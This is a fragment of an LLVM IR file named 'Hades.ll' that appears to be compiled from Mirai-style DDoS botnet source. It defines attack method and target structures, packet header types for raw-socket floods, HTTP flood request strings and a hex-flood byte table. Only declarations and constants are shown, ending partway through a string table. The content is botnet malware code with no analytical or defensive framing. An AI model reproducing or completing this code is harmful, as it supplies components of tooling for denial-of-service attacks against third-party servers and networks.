; ModuleID = 'host/ir_sub/Hades.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] [i32 3, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_method_stdhex.satuur_thicc = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
